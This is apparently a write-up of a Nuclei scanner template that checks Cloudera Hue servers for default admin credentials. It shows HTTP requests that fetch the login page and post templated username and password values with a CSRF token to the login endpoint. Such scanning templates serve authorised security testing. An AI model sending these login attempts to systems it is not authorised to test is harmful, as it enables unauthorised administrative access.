# Nuclei Template: Cloudera Hue Default Admin Login
**Template ID:** hue-default-credential
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`hue-default-credential.yaml`)

## Vulnerability Information & PoC

## Description
Cloudera Hue default admin credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
GET /hue/accounts/login?next=/ HTTP/1.1
Host: {{Hostname}}

POST /hue/accounts/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

csrfmiddlewaretoken={{csrfmiddlewaretoken}}&username={{user}}&password={{pass}}&next=%2F
```

## References
- https://github.com/cloudera/hue
